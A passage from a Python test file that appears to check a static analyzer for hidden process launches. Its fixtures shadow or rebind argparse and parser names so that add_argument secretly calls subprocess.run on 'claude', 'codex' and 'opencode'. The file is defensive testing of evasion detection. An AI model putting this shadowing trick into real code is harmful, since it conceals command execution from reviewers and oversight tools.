            '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_activity_global_quiet_class_unknown_local_class_shadow_stays_argv(tmp_path):
    script = tmp_path / "local-class.py"
    script.write_text('import argparse\n' + _quiet_class_definition() +
        'def main():\n    class QuietParser:\n        pass\n    parser = QuietParser()\n'
        '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert "argv claude" in _egress_por_ast(str(script))


def test_activity_argparse_namespace_definition_shadow_stays_argv(tmp_path):
    for index, keyword in enumerate(("def", "async def")):
        script = tmp_path / ("namespace-" + str(index) + ".py")
        script.write_text('import argparse\n'
            'def main():\n    ' + keyword + ' argparse(*args):\n        return writer\n'
            '    parser = argparse.ArgumentParser()\n'
            '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_activity_global_quiet_class_nested_parameter_shadow_stays_argv(tmp_path):
    script = tmp_path / "nested-parameter.py"
    script.write_text('import argparse\n' + _quiet_class_definition() +
        'def outer(QuietParser):\n    def inner():\n        parser = QuietParser()\n'
        '        parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert "argv claude" in _egress_por_ast(str(script))


def test_activity_global_quiet_class_nested_assignment_shadow_stays_argv(tmp_path):
    for index, binding in enumerate(('QuietParser = writer', 'QuietParser: object = writer',
                                      'class QuietParser:\n        pass')):
        script = tmp_path / ("nested-binding-" + str(index) + ".py")
        script.write_text('import argparse\n' + _quiet_class_definition() +
            'def outer():\n    ' + binding + '\n    def inner():\n        parser = QuietParser()\n'
            '        parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_activity_global_parser_receiver_nested_shadow_stays_argv(tmp_path):
    for index, outer in enumerate(('def outer(parser):\n',
                                   'def outer():\n    parser = writer\n',
                                   'def outer():\n    def parser():\n        return writer\n')):
        script = tmp_path / ("nested-receiver-" + str(index) + ".py")
        script.write_text('import argparse\nparser = argparse.ArgumentParser()\n' + outer +
            '    def inner():\n'
            '        parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def _declared_namespace_writer():
    return ('import subprocess\n'
            'class Writer:\n'
            '    def add_argument(self, *args, choices):\n'
            '        return subprocess.run(choices)\n'
            'def writer():\n    return Writer()\n')


def test_activity_declared_global_quiet_class_rebinding_stays_argv(tmp_path):
    script = tmp_path / "declared-global-class.py"
    script.write_text('import argparse\n' + _quiet_class_definition() +
        _declared_namespace_writer() +
        'def replace():\n    global QuietParser\n    QuietParser = writer\n'
        'replace()\nparser = QuietParser()\n'
        'parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert "argv claude" in _egress_por_ast(str(script))


def test_activity_declared_nonlocal_quiet_class_rebinding_stays_argv(tmp_path):
    script = tmp_path / "declared-nonlocal-class.py"
    script.write_text('import argparse\n' + _declared_namespace_writer() +
        'def outer():\n' + _quiet_class_definition("    ") +
        '    def replace():\n        nonlocal QuietParser\n        QuietParser = writer\n'
        '    replace()\n    parser = QuietParser()\n'
        '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n'
        'outer()\n', encoding="utf8")
    assert "argv claude" in _egress_por_ast(str(script))


def test_activity_declared_parser_receiver_rebinding_stays_argv(tmp_path):
    cases = (
        'parser = argparse.ArgumentParser()\n'
        'def replace():\n    global parser\n    parser = writer()\n'
        'replace()\nparser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n',
        'def outer():\n    parser = argparse.ArgumentParser()\n'
        '    def replace():\n        nonlocal parser\n        parser = writer()\n'
        '    replace()\n    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n'
        'outer()\n',
    )
    for index, body in enumerate(cases):
        script = tmp_path / ("declared-receiver-" + str(index) + ".py")
        script.write_text('import argparse\n' + _declared_namespace_writer() + body, encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_activity_declared_argparse_namespace_stays_argv(tmp_path):
    cases = (
        'import argparse\n'
        'def replace():\n    global argparse\n    argparse = writer\n'
        'replace()\nparser = argparse.ArgumentParser()\n'
        'parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n',
        'def outer():\n    import argparse\n'
        '    def replace():\n        nonlocal argparse\n        argparse = writer\n'
        '    replace()\n    parser = argparse.ArgumentParser()\n'
        '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n'
        'outer()\n',
    )
    for index, body in enumerate(cases):
        script = tmp_path / ("declared-argparse-" + str(index) + ".py")
        namespace = ('class Namespace:\n'
                     '    def ArgumentParser(self):\n        return writer()\n')
        script.write_text(_declared_namespace_writer() + namespace +
                          body.replace('argparse = writer', 'argparse = Namespace()'), encoding="utf8")
        assert "argv claude" in _egress_por_ast(str(script))


def test_activity_unrelated_namespace_declaration_keeps_local_quiet_data(tmp_path):
    script = tmp_path / "unrelated-declaration.py"
    script.write_text('counter = 0\ndef bump():\n    global counter\n    counter = 1\n'
        'def main():\n    import argparse\n' + _quiet_class_definition("    ") +
        '    parser = QuietParser()\n'
        '    parser.add_argument("--runtime", choices=("claude", "codex", "opencode"))\n', encoding="utf8")
    assert _egress_por_ast(str(script)) == []


# ====================================================================== auditoría 2026-11-09 (H-5)

